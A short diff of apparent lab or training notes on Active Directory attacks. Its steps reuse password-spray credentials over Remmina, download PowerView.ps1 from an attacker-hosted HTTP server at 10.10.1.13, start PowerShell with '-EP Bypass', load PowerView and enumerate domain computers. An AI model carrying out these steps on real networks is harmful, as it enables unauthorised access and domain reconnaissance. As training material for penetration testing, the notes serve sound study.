@@ -1033,9 +1033,10 @@ found here mark is pewned
 cd /root/ADtools
  python3 -m http.server in the terminal and press Enter to start the HTTP server.
 open Remmina with credential opt from password spray technique 
-Then, open the Firefox browser and navigate to the URL http://10.10.1.13:8000/PowerView.ps1
+Then, open the Firefox browser and navigate to the URL http://10.10.1.13:8000/PowerView.ps1 and download it
 open powershell
 cd Downloads 
+before load the file
 Powershell -EP Bypass
 . .\PowerView.ps1
 Get-NetComputer (shows computer object)
